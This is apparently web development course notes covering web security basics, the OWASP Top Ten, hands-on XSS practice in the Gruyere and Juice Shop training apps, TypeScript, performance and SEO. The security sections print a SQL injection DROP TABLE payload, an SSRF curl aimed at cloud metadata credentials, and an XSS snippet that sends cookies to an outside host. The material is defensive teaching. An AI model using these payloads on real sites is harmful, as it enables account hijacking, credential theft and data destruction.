+The internet allows us to socially connect, conduct financial transactions, and provide access to sensitive individual, corporate, and government data. It is also accessible from every corner of the planet. This positions the internet as a tool that can make the world a much better place, but it also makes a very attractive target for those who would seek to do harm. Preventing that potential for harm needs to be in the forefront of you mind whenever you create or use a web application.
+
+You can see bad actors at work on your very own server by using `ssh` to open a console to your server and reviewing the authorization log. The authorization log captures all of the attempts to create a session on your server.
+
+```sh
+sudo less +G /var/log/auth.log
+```
+
+The last entry in the log will be from your connection to the server.
+
+```sh
+Feb 23 16:26:54 sshd[319071]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)
+Feb 23 16:26:54 systemd-logind[480]: New session 1350 of user ubuntu.
+Feb 23 16:26:54 systemd: pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by (uid=0)
+```
+
+However, you will see lots of other attempts with specific user names associated with common exploits. These all should be failing to connect, but if your server is not configured properly then an unauthorized access is possible. The sample of attempts below show the IP addresses of the attacker, as well as the user name that they used. Using the `whois` utility we can see that these attacks are originating from servers at DLive.kr in Korea, and DigitalOcean.com in the USA.
+
+```sh
+Feb 19 02:34:28 sshd[298185]: Invalid user developer from 27.1.253.142
+Feb 19 02:37:12 sshd[298193]: Invalid user minecraft1 from 27.1.253.142
+Feb 23 14:26:19 sshd[318868]: Invalid user siteadmin 174.138.72.191
+Feb 23 14:22:18 sshd[318845]: Invalid user tester 174.138.72.191
+```
+
+As an experiment, one of our TAs created a test server with a user named `admin` with password `password`. Within 15 minutes, an attacker had logged in, bypassed all the restrictions that were in place, and started using the server to attack other servers on the internet.
+
+Even if you don't think your application is valuable enough to require security, you need to consider that you might be creating a security problem for your users on other systems. For example, think about a simple game application where a user is required to provides a username and password in order to play the game. If the application's data is then compromised, then an attacker could use the password, used for the game application, to gain access to other websites where the user might have used the same password. For example, their social networking sites, work account, or financial institution.
+
+## Security terminology
+
+Web application security, sometimes called AppSec, is a subset of cybersecurity that specifically focuses on preventing security vulnerabilities within end-user applications. Web application security involves securing the frontend code running on the user's device and also the backend code running on the web server.
+
+Here is a list of common phrases used by the security community that you should be familiar with.
+
+- **Hacking** - The process of making a system do something it's not supposed to do.
+- **Exploit** - Code or input that takes advantage of a programming or configuration flaw.
+- **Attack Vector** - The method that a hacker employs to penetrate and exploit a system.
+- **Attack Surface** - The exposed parts of a system that an attacker can access. For example, open ports (22, 443, 80), service endpoints, or user accounts.
+- **Attack Payload** - The actual code, or data, that a hacker delivers to a system in order to exploit it.
+- **Input sanitization** - "Cleaning" any input of potentially malicious data.
+- **Black box testing** - Testing an application without knowledge of the internals of the application.
+- **White box testing** - Testing an application by **with** knowledge of the source code and internal infrastructure.
+- **Penetration Testing** - Attempting to gain access to, or exploit, a system in ways that are not anticipated by the developers.
+- **Mitigation** - The action taken to remove, or reduce, a threat.
+
+## Motivation for attackers
+
+The following lists some common motivations at drives a system attack.
+
+- **Disruption** - By overloading a system, encrypting essential data, or deleting critical infrastructure, an attacker can destroy normal business operations. This may be an attempt at extortion, or simply be an attempt to punish a business that that attacker does not agree with.
+- **Data exfiltration** - By privately extracting, or publicly exposing, a system's data, an attacker can embarrass the company, exploit insider information, sell the information to competitors, or leverage the information for additional attacks.
+- **Resource consumption** - By taking control of a company's computing resources an attacker can use it for other purposes such as mining cryptocurrency, gathering customer information, or attacking other systems.
+
+## Examples of security failures
+
+Security should always be a primary objective of any application. Building a web application that looks good and performs well, is a lot less important than building an application that is secure.
+
+Here are a few examples where companies failed to properly prevent attacks to their systems.
+
+- [$100 million dollars stolen through insider trading using SQL injection vulnerability](https://www.theverge.com/2018/8/22/17716622/sec-business-wire-hack-stolen-press-release-fraud-ukraine)
+- [Log4Shell remote code execution vulnerability, 93% of cloud vulnerable at time of discovery, dubbed "the most severe vulnerability ever"](https://en.wikipedia.org/wiki/Log4Shell)
+- [Russian hackers install backdoor on 18,000 government and Fortune 500 computers](https://www.npr.org/2021/04/16/985439655/a-worst-nightmare-cyberattack-the-untold-story-of-the-solarwinds-hack)
+- [Hackers Hold Computers of 23 Texas Towns For Ransom](https://www.usnews.com/news/national-news/articles/2019-08-20/hackers-hold-computers-of-23-texas-towns-for-ransom)
+
+## Common hacking techniques
+
+There are a few common exploitation techniques that you should be aware of. These include the following.
+
+- **Injection**: When an application interacts with a database on the backend, a programmer will often take user input and concatenate it directly into a search query. This allows a hacker can use a specially crafted query to make the database reveal hidden information or even delete the database.
+
+- **Cross-Site Scripting (XSS)**: A category of attacks where an attacker can make malicious code execute on a different user's browser. If successful, an attacker can turn a website that a user trusts, into one that can steal passwords and hijack a user's account.
+
+- **Denial of Service**: This includes any attack where the main goal is to render any service inaccessible. This can be done by deleting a database using an SQL injection, by sending unexpected data to a service endpoint that causes the program to crash, or by simply making more requests than a server can handle.
+
+- **Credential Stuffing**: People have a tendency to reuse passwords or variations of passwords on different websites. If a hacker has a user's credentials from a previous website attack, then there is a good chance that they can successfully use those credentials on a different website. A hacker can also try to brute force attack a system by trying every possible combination of password.
+
+- **Social engineering** - Appealing to a human's desire to help, in order to gain unauthorized access or information.
+
+## What can I do about it?
+
+Taking the time to learn the techniques a hacker uses to attack a system is the first step in preventing them from exploiting your systems. From there, develop a security mindset, where you always assume any attack surface will be used against you. Make security a consistent part of your application design and feature discussions. Here is a list of common security practices you should include in your applications.
+
+- **Sanitize input data** - Always assume that any data you receive from outside your system will be used to exploit your system. Consider if the input data can be turned into an executable expression, or can overload computing, bandwidth, or storage resources.
+- **Logging** - It is not possible to think of every way that your system can be exploited, but you can create an immutable log of requests that will expose when a system is being exploited. You can then trigger alerts, and periodically review the logs for unexpected activity.
+- **Traps** - Create what appears to be valuable information and then trigger alarms when the data is accessed.
+- **Educate** - Teach yourself, your users, and everyone you work with, to be security minded. Anyone who has access to your system should understand how to prevent physical, social, and software attacks.
+- **Reduce attack surfaces** - Do not open access anymore than is necessary to properly provide your application. This includes what network ports are open, what account privileges are allowed, where you can access the system from, and what endpoints are available.
+- **Layered security** - Do not assume that one safeguard is enough. Create multiple layers of security that each take different approaches. For example, secure your physical environment, secure your network, secure your server, secure your public network traffic, secure your private network traffic, encrypt your storage, separate your production systems from your development systems, put your payment information in a separate environment from your application environment. Do not allow data from one layer to move to other layers. For example, do not allow an employee to take data out of the production system.
+- **Least required access policy** - Do not give any one user all the credentials necessary to control the entire system. Only give a user what access they need to do the work they are required to do.
+- **Safeguard credentials** - Do not store credentials in accessible locations such as a public GitHub repository or a sticky note taped to a monitor. Automatically rotate credentials in order to limit the impact of an exposure. Only award credentials that are necessary to do a specific task.
+- **Public review** - Do not rely on obscurity to keep your system safe. Assume instead that an attacker knows everything about your system and then make it difficult for anyone to exploit the system. If you can attack your system, then a hacker will be able to also. By soliciting public review and the work of external penetration testers, you will be able to discover and remove potential exploits.
+
+
+
+# OWASP
+
+<a id="security-owasp"></a>OWASP:
+[go to top](#top)
+
+![owasp](owaspLogo.png)
+
+📖 **Deeper dive reading**: [OWASP 2021](https://owasp.org/www-project-top-ten/)
+
+The Open Web Application Security Project (OWASP) is a non-profit research entity that manages the _Top Ten_ list of the most important web application security risks. Understanding, and periodically reviewing, this list will help to keep your web applications secure.
+
+The following is a discussion of each of the entries in the top ten list, along with examples, and suggested mitigations.
+
+## A01 Broken Access Control
+
+📖 **Deeper dive reading**: [snyk Learn broken access control](https://learn.snyk.io/lessons/broken-access-control/javascript/)
+
+Broken access control occurs when the application doesn't properly enforce permissions on users. This could mean that a non-admin user can do things that only an admin should be able to do, or admin accounts are improperly secured. While browser application code can restrict access by disabling UI for navigating to sensitive functionality, the ultimate responsibility for enforcing access control rests upon the application service.
+
+As an example of broken access control, consider an application where the UI only provides a navigation to the administrator application settings if the user is an administrator. However, the attacker can simply change the URL to point to the application settings URL and gain access. Additionally, unless the service endpoints reject requests to obtain, and update, the application settings, any restrictions that the UI provides are meaningless.
+
+Mitigations include:
+
+- Strict access enforcement at the service level
+- Clearly defined roles and elevation paths
+
+## A02 Cryptographic Failures
+
+Cryptographic failures occur when sensitive data is accessible either without encryption, with weak encryption protocols, or when cryptographic protections are ignored.
+
+Sending any unencrypted data over a public network connection allows an attacker to capture the data. Even private, internal, network connections, or data that is store without encryption, is susceptibly to exploitation once an attacker gains access to the internal system.
+
+Examples of ineffective cryptographic methods include hashing algorithms like MD5 and SHA-1 that are trivial to crack with modern hardware and tools.
+
+Another cryptographic failure happens when applications do not validate the provided web certificate when establishing a network connection. This is a case of falsely assuming that if the protocol is secure then the entity represented by the protocol is acceptable.
+
+Mitigations include:
+
+- Use strong encryption for all data. This includes external, internal, in transit, and at rest data.
+- Updating encryption algorithms as older algorithms become compromised.
+- Properly using cryptographic safeguards.
+
+## A03 Injection
+
+📖 **Deeper dive reading**: [Snyk Learn SQL injection](https://learn.snyk.io/lessons/sql-injection/javascript/)
+
+Injection exploits occur when an attacker is allowed to supply data that is then injected into a context where it violates the expected use of the user input. For example, consider an input field that is only expected to contain a user's password. Instead the attacker supplies a SQL database command in the password input.
+
+**Supplied password**
+
+```js
+`p@ssword!'; DROP TABLE db; --`;
+```
+
+The application then uses a template SQL query to validate the user's password.
+
+**Template query**
+
+```js
+`SELECT user FROM db WHERE password='${password}' LIMIT 1`;
+```
+
+When the supplied input is injected into the template an unintended query results. Notice that this query will delete the entire database table.
+
+**Resulting query**
+
+```sql
+SELECT user FROM db WHERE password='p@ssword!'; DROP TABLE db; -- ` LIMIT 1
+```
+
+Mitigations include:
+
+- Sanitizing input
+- Use database prepared statements
+- Restricting execution rights
+- Limit output
+
+## A04 Insecure Design
+
+📖 **Deeper dive reading**: [Snyk Learn insecure design](https://learn.snyk.io/lessons/insecure-design/javascript/)
+
+Insecure design broadly refers to architectural flaws that are unique for individual systems, rather than implementation errors. This happens when the application team doesn't focus on security when designing a system, or doesn't continuously reevaluate the application's security.
+
+Insecure design exploits are based upon unexpected uses of the business logic that controls the functionality of the application. For example, if the application allows for trial accounts to be easily created, then an attacker could create a denial of service attack by creating millions of accounts and utilizing the maximum allowable usage.
+
+Mitigations include:
+
+- Integration testing
+- Strict access control
+- Security education
+- Security design pattern usages
+- Scenario reviews
+
+## A05 Security Misconfiguration
+
+Security misconfiguration attacks exploit the configuration of an application. Some examples include using default passwords, not updating software, exposing configuration settings, or enabling unsecured remote configuration.
+
+For example, some third party utilities, such as a logging system, will expose a public administration interface that has a default user name and password. Unless that configuration is changed, an attacker will be able to access all of the critical logging information for your application.
+
+Mitigations include:
+
+- Configuration reviews
+- Setting defaults to disable all access
+- Automated configuration audits
+- Requiring multiple layers of access for remote configuration
+
+## A06 Vulnerable and Outdated Components
+
+📖 **Deeper dive reading**: [Snyk Learn vulnerable and outdate components](https://learn.snyk.io/lessons/vulnerable-and-outdated-components/javascript/)
+
+The longer an application has been deployed, the more likely it is that the attack surface, and corresponding exploits, of the application will increase. This is primarily due to the cost of maintaining an application and keeping it up to date in order to mitigate newly discovered exploits.
+
+Outdated components often accumulate as third party packages are used by the application. Over time the packages are updated in order to address security concerns, or somethings the packages stop being supported. When this happens your application becomes vulnerable. Consider what happens when a request to install NPM packages displays the following warning:
+
+```sh
+➜  npm install
+
+up to date, audited 1421 packages in 3s
+
+7 high severity vulnerabilities
+
+To address all issues (including breaking changes), run:
+  npm audit fix --force
+
+Run `npm audit` for details.
+```
+
+The application developer is warned that the components are vulnerable, but when faced choice of taking the time to update packages, and potentially break the application, or meeting deliverable deadlines, the developer is tempted to ignore the warning and continue without addressing the possible problem.
+
+Mitigations include:
+
+- Keeping a manifest of your software stack including versions
+- Reviewing security bulletins
+- Regularly updating software
+- Required components to be up to date
+- Replacing unsupported software
+
+## A07 Identification and Authentication Failures
+
+Identification and authentication failures include any situation where a user's identity can be impersonated or assumed by an attacker. For example, if an attacker can repeatedly attempt to guess a user's password, then eventually they will be successful. Additionally, if passwords are exposed outside of the application, or are stored inside the application, with weak cryptographic protection, then they are susceptible to attack.
+
+Another example of an identification failure would be a weak password recovery process that doesn't properly verify the user. Common practices such as asking for well known security questions (e.g. mother's maiden name) from a user fall into this category.
+
+Mitigations include:
+
+- Rate limiting requests
+- Properly managing credentials
+- Multifactor authentication
+- Authentication recovery
+
+## A08 Software and Data Integrity Failure
+
+Software and data integrity failures represent attacks that allow external software, processes, or data to compromise your application. Modern web applications extensively use open source and commercially produced packages to provide key functionality. Using these packages without conducting a security audit, gives them an unknown amount of control over your application. Likewise, using a third party processing workflow, or blindly accessing external data, opens you up to attacks.
+
+Consider the use of a third party continuous delivery (CD) pipeline for deploying your application to a cloud provider. If the CD provider is penetrated by an attacker then they also gain access to your production cloud environment.
+
+Another example is the use of an NPM package that is controlled by an attacker. Once the package has gained general acceptance, the attacker can subtly change the package to capture and deliver sensitive information.
+
+Mitigations include:
+
+- Only using trusted package repositories
+- Using your own private vetted repository
+- Audit all updates to third party packages and data sources
+
+## A09 Security Logging and Monitoring Failures
+
+📖 **Deeper dive reading**: [Snyk Learn logging vulnerabilities](https://learn.snyk.io/lessons/logging-vulnerabilities/javascript/)
+
+Proper system monitoring, logging, and alerting is critical to increasing security. One of the first things an attacker will do after penetrating your application is delete or alter any logs that might reveal the attacker's presence. A secure system will store logs that are accessible, immutable, and contain adequate information to detect an intrusion, and conduct post-mortem analysis.
+
+An attacker might also try to create a smoke screen in the monitoring system in order to hide a true attack. This might consist of a barrage of periodic ineffective attacks that hide the insertion of a slightly different effective one.
+
+Mitigations include:
+
+- Real time log processing
+- Automated alerts for metric threshold violations
+- Periodic log reviews
+- Visual dashboards for key indicators
+
+## A10 Server Side Request Forgery (SSRF)
+
+📖 **Deeper dive reading**: [Snyk Learn SSRF](https://learn.snyk.io/lessons/ssrf-server-side-request-forgery/javascript/)
+
+This category of attack causes the application service to make unintended internal requests, that utilized the service's elevated privileges, in order to expose internal data or services.
+
+For example, if your service exposed an endpoint that let a user retrieve an external profile image based upon a supplied URL, an attacker could change the URL to point to a location that is normally only available to the service internally.
+
+The following command would theoretically return the internal AWS service metadata that includes the administrative access token.
+
+```sh
+curl https://yourdomain.click/user/image?imgUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/Admin-Role
+```
+
+Mitigations include:
+
+- Sanitizing returned data
+- Not returning data
+- Whitelisting accessible domains
+- Rejecting HTTP redirects
+
+
+
+# Security practice
+
+<a id="security-practice"></a>Security practice:
+[go to top](#top)
+
+You will not really internalize how security exploits work until you get some practice with them. One way to do this is to use a practice security web applications. There are lots of practice applications but we will discuss two of them, Gruyere and Juice Shop.
+
+## Gruyere
+
+[Gruyere](https://google-gruyere.appspot.com) provides tutorials and practice with things like Cross-site scripting (XSS), Denial of Service (DoS), SQL injection, and elevation of privilege attacks.
+
+Gruyere runs on Google AppEngine and so it is easy to start, play with, and reset when you want to start over.
+
+You can learn about how to use Gruyere by reading the set up [page](https://google-gruyere.appspot.com/part1). Make sure you notice the **Table of Contents** located on the right side of the page in order to learn about the different attacks and how to exploit them.
+
+You start the practice environment by following this [link](https://google-gruyere.appspot.com/start). This will display a page that looks like the following.
+
+![Gruyere](gruyereHome.jpg)
+
+For the purposes of this instruction we are only going to talk about Cross-Site Scripting (XSS) attacks. Feel free to explore everything provided by Gruyere as your time and interest allows.
+
+### Cross-Site Scripting (XSS)
+
+Open the [Gruyere Instruction](https://google-gruyere.appspot.com/part2) on XSS. Take some time to read the description of XSS attacks and then open up the practice instance of Gruyere that you created above.
+
+Using what we have learned from the tasks, hints, and examples described in the Gruyere instruction, we will create our own XSS attack.
+
+1. Create an account in the Gruyere application using some bogus user name and password.
+1. Navigate back to the home page.
+1. Select the `New Snippets` option in order to create a snippet that will show on the home screen for all users of the application.
+
+   The Gruyere developers assumed the snippet functionality would be used to share information about cheese, but you will use it to execute a XSS attack on anyone who views your snippet.
+
+1. Paste the following into the snippet input box and press submit.
+   ```html
+   <img src="null" onerror="document.body.style.background='white'" />
+   ```
+   ![XSS Snippet submission](gruyereXssSnippetSubmit.jpg)
+
+Now, whenever any user of Gruyere goes to their home page they will see your snippet, and it will execute the JavaScript XSS attack and turn their body background color white.
+
+![XSS Snippet result](gruyereXssSnippetResult.jpg)
+
+If you logout of Gruyere and create a new user account, you will see that your attack works on all users.
+
+Changing the background color isn't very much of an attack, but it does visually demonstrate that you are have taken control of the application. You could just have easily grabbed the user's cookie and sent it to a service endpoint where you could start collecting information on Gruyere customers.
+
+```html
+<img src="null" onerror="fetch(`https://hkz.click/xss/${document.cookie}`)" />
+```
+
+If you create another snippet with the above example, open up the network tab in the browser's dev tools, and navigate to the Gruyere home page, you will see the browser attempting to send the user's cookie to `hkz.click`.
+
+![XSS cookie grab](gruyereXssSnippetCookieGrab.jpg)
+
+## Juice Shop
+
+![Juice Shop](JuiceShopLogo.png)
+
+OWASP provides a security training application called [Juice Shop](https://github.com/juice-shop/juice-shop#-owasp-juice-shop). Unlike Gruyere, You need to download the code for Juice Shop and run it from your own computer, but the advantage is that you have complete control over Juice Shop and it is a really good practice application.
+
+If you are at all interested in improving your security skills, you should take the time to install and explore Juice Shop. Otherwise what you have done with Gruyere should be enough to give you a feel for what security practice applications have to offer.
+
+### Installing Juice Shop
+
+1. Clone the Juice Shop repository to your development environment and install the required NPM packages.
+
+   ```sh
+   git clone https://github.com/juice-shop/juice-shop.git --depth 1
+
+   cd juice-shop
+
+   npm install
+   ```
+
+1. Run the application. This should start Juice Shop on port 3000.
+   ```sh
+   npm start
+   ```
+1. You can now open your browser to `localhost:3000`. This will display the Juice Shop application.
+
+   ![JuiceShop Home](juiceShopHome.jpg)
+
+The idea with Juice Shop is that you are suppose to learn by digging in and experimenting. For a person that is new to security hacking this can be a bit daunting, and so here is a hint to get you started.
+
+You can solve the first hacking challenge by discovering the hidden score board view that shows you all of the possible challenges to solve, and exposes the available tutorials. You can discover where the score board is by examining the contents of the `main.js` file in Dev Tools and seeing that it references a path named `score-board`. So if you change the url to be `localhost:3000/#/score-board` you will see the following view.
+
+![JuiceShop Home](juiceShopScoreBoard.jpg)
+
+You can then find a challenge that looks interesting and try to solve it. Challenges that have a tutorial icon will step you through the challenge and explain how it works. You can then use that knowledge to solve challenges that don't have a tutorial.
+
+To begin, it is suggested that you do the `DOM XSS` tutorial. This will show you how to do a XSS attack using the application search input.
+
+
+
+# TypeScript
+
+<a id="typescript"></a>TypeScript:
+[go to top](#top)
+
+📖 **Deeper dive reading**: [Typescript in 5 minutes](https://www.typescriptlang.org/docs/handbook/typescript-in-5-minutes.html)
+
+TypeScript adds static type checking to JavaScript. This provides type checking while you are writing the code to prevent mistakes like using a string when a number is expected. Consider the following simplistic JavaScript code example.
+
+```js
+function increment(value) {
+  return value + 1;
+}
+
+let count = 'one';
+console.log(increment(count));
+```
+
+When this code executes the console will log `one1` because the count variable was accidentally initialized with a string instead of a number.
+
+With TypeScript you explicitly define the types, and as the JavaScript is transpiled (with something like Babel) an error will be generate long before the code is seen by a user. To provide type safety for our increment function, it would look like this:
+
+```ts
+function increment(value: number) {
+  return value + 1;
+}
+
+let count: number = 'one';
+console.log(increment(count));
+```
+
+With TypeScript enabled, VS Code will analyze the code and give you an error about the invalid type conversion.
+
+![TypeScript bad assignment](typescriptBadAssignment.jpg)
+
+In addition to defining types for function parameters, you can define the types of object properties. For example, when defining the state for a React class style component, you can specify the types of all the state and property values.
+
+```ts
+export class About extends React.Component {
+  state: {
+    imageUrl: string;
+    quote: string;
+    price: number;
+  };
+
+  constructor(props: { price: number }) {
+    super(props);
+
+    this.state = {
+      imageUrl: '',
+      quote: 'loading...',
+      price: props.price,
+    };
+  }
+}
+```
+
+You can likewise specify the type of a React function style component's properties with an inline object definition.
+
+```ts
+function Clicker(props: { initialCount: number }) {
+  const [count, updateCount] = React.useState(props.initialCount);
+
+  return <div onClick={() => updateCount(1 + count)}>Click count: {count}</div>;
+}
+```
+
+## Interfaces
+
+Because it is so common to define object property types, TypeScript introduced the use of the `interface` keyword to define a collection of parameters and types that an object must contain in order to satisfy the interface type. For example, a Book interface might look like the following.
+
+```ts
+interface Book {
+  title: string;
+  id: number;
+}
+```
+
+You can then create an object and pass it to a function that requires the interface.
+
+```ts
+function catalog(book: Book) {
+  console.log(`Cataloging ${book.title} with ID ${book.id}`);
+}
+
+const myBook = { title: 'Essentials', id: 2938 };
+catalog(myBook);
+```
+
+## Beyond type checking
+
+TypeScript also provides other benefits, such as warning you of potential uses of an uninitialized variable. Here is an example of when a function may return null, but the code fails to check for this case.
+
+![TypeScript uninitialized](typescriptUninitialized.jpg)
+
+You can correct this problem with a simple `if` block.
+
+```ts
+const containerEl = document.querySelector<HTMLElement>('#picture');
+if (containerEl) {
+  const width = containerEl.offsetWidth;
+}
+```
+
+Notice that in the above example, the return type is coerced for the `querySelector` call. This is required because the assumed return type for that function is the base class `Element`, but we know that our query will return the subclass `HTMLElement` and so we need to cast that to the subclass with the `querySelector<HTMLElement>()` syntax.
+
+### Unions
+
+TypeScript introduces the ability to define the possible values for a new type. This is useful for doing things like defining an enumerable.
+
+With plain JavaScript you might create an enumerable with a class.
+
+```js
+export class AuthState {
+  static Unknown = new AuthState('unknown');
+  static Authenticated = new AuthState('authenticated');
+  static Unauthenticated = new AuthState('unauthenticated');
+
+  constructor(name) {
+    this.name = name;
+  }
+}
+```
+
+With TypeScript you can define this by declaring a new type and defining what its possible values are.
+
+```ts
+type AuthState = 'unknown' | 'authenticated' | 'unauthenticated';
+
+let auth: AuthState = 'authenticated';
+```
+
+You can also use unions to specify all of the possible types that a variable can represent.
+
+```ts
+function square(n: number | string) {
+  if (typeof n === 'string') {
+    console.log(`{$n}^2`);
+  } else {
+    console.log(n * n);
+  }
+}
+```
+
+## Using TypeScript
+
+If you would like to experiment with TypeScript you can use [CodePen](https://codepen.io), or the official [TypeScript playground](https://www.typescriptlang.org/play). The TypeScript playground has the advantage of showing you inline errors and what the resulting JavaScript will be.
+
+![typescript playground](typescriptPlayground.jpg)
+
+To use TypeScript in your web application you can create your project using the `create-react-app` CLI and specifying the `--template typescript` switch. This will configure the template application to use TypeScript.
+
+```sh
+npx create-react-app my-app --template typescript
+```
+
+If you want to convert an existing application, then install the NPM `typescript` package to your development dependencies.
+
+```sh
+npm install --save-dev typescript
+```
+
+This will only include typescript package when you are developing and will not distribute it with a production bundle.
+
+Once you have TypeScript installed for your project, you then configure how you want TypeScript to interact with your code by creating a `tsconfig.json` file.
+
+If your project structure is configured to have your source code in a directory named `src`, and you want to output to a directory named `build` then you would use the following TS configuration file.
+
+```js
+{
+  "compilerOptions": {
+    "rootDir": "src",
+    "outDir": "build",
+    "target": "es5",
+    "lib": [
+      "dom",
+      "dom.iterable",
+      "esnext"
+    ],
+    "allowJs": true,
+    "skipLibCheck": true,
+    "esModuleInterop": true,
+    "allowSyntheticDefaultImports": true,
+    "strict": true,
+    "forceConsistentCasingInFileNames": true,
+    "noFallthroughCasesInSwitch": true,
+    "module": "esnext",
+    "moduleResolution": "node",
+    "resolveJsonModule": true,
+    "isolatedModules": true,
+    "noEmit": true,
+    "jsx": "react-jsx"
+  },
+  "include": [
+    "./src/**/*"
+  ]
+}
+```
+
+To learn what all of the tsconfig.json options do, refer to [What is a tsconfig.json](https://www.typescriptlang.org/docs/handbook/tsconfig-json.html).
+
+
+
+# Performance monitoring
+
+<a id="performance-monitoring"></a>Performance monitoring:
+[go to top](#top)
+
+The performance of your application plays a huge role in determining user satisfaction. The following statistics show the impact that just one second of delay can make.
+
+![Latency impact](performanceLatencyImpact.jpg)
+
+> **Source**: WPEngine
+
+In order to prevent losing users, you want your application to load in about one second. That means you need consistently measure and improve the responsiveness of your application. The main things you want to monitor include:
+
+1. Browser application latency
+1. Network latency
+1. Service endpoint latency
+
+For the context of this discussion, latency is defined as the delay that your user experiences before a request is satisfied.
+
+Let's look at each of these performance areas, and then we can suggest some tools for measuring and improving the results.
+
+## Browser application latency
+
+Browser application latency is impacted by the speed of the user's device, the amount of data that needs to be processed, and the time complexity of the processing algorithm.
+
+When a user requests your application in a browser, the browser will request your `index.html` page first. This is followed by requests for any files that `index.html` links, such as JavaScript, CSS, video, and image files. Once your JavaScript is loaded, it will start making requests to services. This includes any endpoints that your provide as well as ones provided by third parties. Each of those requests takes time for the browser to load and render. A page with lots of large images and lots of service calls, will take longer than a page that only loads simple text from a single HTML file.
+
+Likewise, if your JavaScript does significant processing while a page is loading, then your user will notice the resulting latency. You want to make application processing as asynchronous as possible so that it is done in the background without impacting the user experience.
+
+You can reduces the impact of file size, and HTTP requests in general, by doing one or more of the following:
+
+1. Use compression when transferring files over HTTP.
+1. Reduce the quality of images and video to the lowest acceptable level.
+1. Minify JavaScript and CSS. This removes all whitespace and creates smaller variable names.
+1. Use HTTP/2 or HTTP/3 so that your HTTP headers are compressed and the communication protocol is more efficient.
+
+You can also reduce the number of requests you make by combining the responses from multiple endpoint requests into a single request. This eliminates duplicated fields, but also decreases the overhead associated with each request.
+
+## Network latency
+
+You pay a latency price for every network request that you make. For this reason, you want to avoid making unnecessary or large requests.
+
+Network latency is impacted by the amount of data that you send, the amount of data a user can receive per second (this is called bandwidth), and the distance the data has to travel.
+
+If the user has a low bandwidth connection that can only receive data at rates lower than 1 megabit per second, then you need to be very careful to reduce the number of bytes that you send to that user. Global latency is also a problem for users. If your application is hosted in a data center located in San Francisco, and used by someone living in Nairobi, then there will be a additional latency of 100 to 400 milliseconds for each request.
+
+You can mitigate the impact of global latency by hosting your application files in data centers that are close to the users you are trying to serve. Applications that are seeking to reach a global audience will often host their application from dozens of places around the world.
+
+## Service endpoint latency
+
+Service endpoint latency is impacted by the number of request that are made and the amount of time that it takes to process each request.
+
+When a web application makes a request to a service endpoint there is usually some functionality in the application that is blocked until the endpoint returns. For example, if a user requests the scores for a game, the application will delay rendering until those scores are returned.
+
+You want to reduce the latency of your endpoints as much as possible. Ideally you want to keep the endpoint latency to less than 10 milliseconds (ms). This may seem like a very short time, but commonly, an application will make dozens of endpoint requests to render a component. If each of those endpoints take 10 ms, then you are looking at 100 to 200 ms. When you add network latency to the time it takes for the application to process the response, and then add the time it takes for the browser to render, you can easily exceed the desired 1 second load time.
+
+## Performance tools
+
+📖 **Deeper dive reading**: [Chrome performance tools](https://developer.chrome.com/docs/devtools/performance/)
+
+### Chrome network tab
+
+You can see the network requests made by your application and the time necessary for each request, by using the browser's debugging tools. This will show you what files and endpoints are requested and how long they are taking. If you sort by `time` or `size`, it will be clearer what areas need your attention. Make sure you clear your cache before running tests so that you can see what the real latency is and not just the time it takes to load from the browser's cache.
+
+![Performance](../../uxdesign/designPerformanceNetwork.jpg)
+
+### Simulating real users
+
+The network tools in the Chrome debugger also allows you to simulate low bandwidth connections by throttling your network. For example, you can simulate a 3G network connection that you would find on a low end mobile phone.
+
+![Throttle network](webFrameworksThrottleNetwork.jpg)
+
+Throttling while testing is really useful since web developers often have high end computers and significant network bandwidth. That means you are not having the same experience as your users, and you will be surprised when they don't use your application because it is so slow.
+
+### Chrome Lighthouse
+
+You can also use the Chrome debugging Lighthouse tool to run an analysis of your application. This will give you an average performance rating based upon the initial load time, longest content paint, and time before the user can interact with the page.
+
+![Performance](../../uxdesign/designPerformance.jpg)
+
+### Chrome performance tab
+
+When you are ready to dig into your application's frontend performance make sure you experiment with the Chrome debugger's performance tab. This breaks down the details of your application based upon discrete intervals of time so that you can isolate where things are running slow.
+
+![Performance tab](webFrameworksChromePerformanceTab.jpg)
+
+You start profiling the performance by pressing the record button and then interacting with your application. Chrome will record memory usage, screenshots, and timing information. You can then press the stop recording button and review the collected data. For example, the performance data represented in the image above, shows that 56% of the execution time was used in the `button.press` function. If you drill in on the source code for the function you will see exactly which lines of the function were consuming the processing time.
+
+### Global speed tests
+
+You also want to test your application from different locations around the world. There are many online providers that will run these test for you. Here are the results for running a test using [Pingdom.com](https://tools.pingdom.com).
+
+![Pingdom](webFrameworksPingdom.jpg)
+
+You can see that it is correctly suggesting that we enable gz compression on our transmitted data in order to increase performance, and to add headers that will enable caching on the browser.
+
+This tool provided by [DotComTools](https://www.dotcom-tools.com) allows you to run tests from multiple locations at once.
+
+![DotCom Tools](webFrameworksDotComTools.jpg)
+
+Here you can see we perform acceptably from the United States and Europe, but are struggling in Asia. That makes sense considering that our server is located in North Virginia. In order to correct this, we need to use a Content Delivery Network (CDN) with an additional location closer to our target users in China.
+
+
+
+# Search engine optimization
+
+<a id="seo"></a>Search engine optimization:
+[go to top](#top)
+
+📖 **Deeper dive reading**: [Google Search Central](https://developers.google.com/search)
+
+Once Google became the de facto search engine for the internet, a new industry was created to help websites get the top search result spots. Modifying your application for search results is called search engine optimization (SEO). While SEO has nothing to do with the functionality of your application, it has everything to do with its success. You can save millions of dollars in marketing if your application appears in the top search ranking for common user searches.
+
+There are several factors that are major contributors to your search rank. These include:
+
+1. Content
+1. Authoritative links
+1. Structure and organization
+1. Metadata
+1. Performance and usability
+
+Let's take a closer look at each of these.
+
+## Content
+
+Search engines pay a lot of attention to the value an application provides. One of the ways you can provide significant value is to host interesting, current, easily accessible content. For example, if your application is about the game Simon, then you should include a history of the game, strategies for playing the game, current news about competitions, and biographies of the world's best players. The key is that there is lots of interesting content and that it is kept current.
+
+You want to make sure that you provide both textual and video content. Also make sure that the content is available without authentication or payment.
+
+## Authoritative links
+
+The success of the Google Page Rank algorithm is founded on determining how authoritative an application is. The more websites that point to your application the higher its search ranking will be. If you can get an influencer to link to your content, or get links from other authoritative applications you will see a significant bump in your ranking.
+
+You also want to be an authority to yourself. This includes links from other applications that you own, and internal application links. Making sure that you have multiple paths to key content from within your application will help the Google crawler find the content and value its authority.
+
+## Structure and organization
+
